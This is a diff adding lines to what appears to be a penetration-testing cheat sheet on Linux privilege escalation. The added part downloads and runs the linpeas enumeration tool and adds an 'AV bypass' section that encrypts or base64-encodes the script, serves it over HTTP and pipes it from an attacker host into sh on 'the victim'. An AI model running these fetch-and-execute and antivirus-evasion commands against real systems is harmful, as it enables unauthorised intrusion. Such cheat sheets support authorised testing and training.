@@ -1589,6 +1589,29 @@ chmod +x /tmp/linpeas.sh
 /tmp/linpeas.sh
 ```
 
+[linpeas github repo](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
+
+```bash
+# Use a linpeas binary
+wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64
+chmod +x linpeas_linux_amd64
+./linpeas_linux_amd64
+```
+
+AV bypass
+```bash
+#open-ssl encryption
+openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:AVBypassWithAES -in linpeas.sh -out lp.enc
+sudo python -m SimpleHTTPServer 80 #Start HTTP server
+curl 10.10.10.10/lp.enc | openssl enc -aes-256-cbc -pbkdf2 -d -pass pass:AVBypassWithAES | sh #Download from the victim
+
+#Base64 encoded
+base64 -w0 linpeas.sh > lp.enc
+sudo python -m SimpleHTTPServer 80 #Start HTTP server
+curl 10.10.10.10/lp.enc | base64 -d | sh #Download from the victim
+```
+
+
 #### unix-privesc-check
 
 Common usage:
